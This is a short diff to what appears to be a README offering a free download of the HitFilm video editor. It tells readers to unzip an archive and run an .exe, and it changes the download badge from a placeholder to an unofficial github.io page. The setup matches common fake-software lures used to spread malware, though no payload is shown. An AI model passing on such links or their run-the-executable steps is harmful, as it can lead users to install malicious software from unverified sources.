@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://hitfilm-fxhome-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="1500" height="843" alt="hitfilm-main-interface" src="https://github.com/user-attachments/assets/0f706b5a-b972-4fd6-9c6f-e997a18ce12c" />
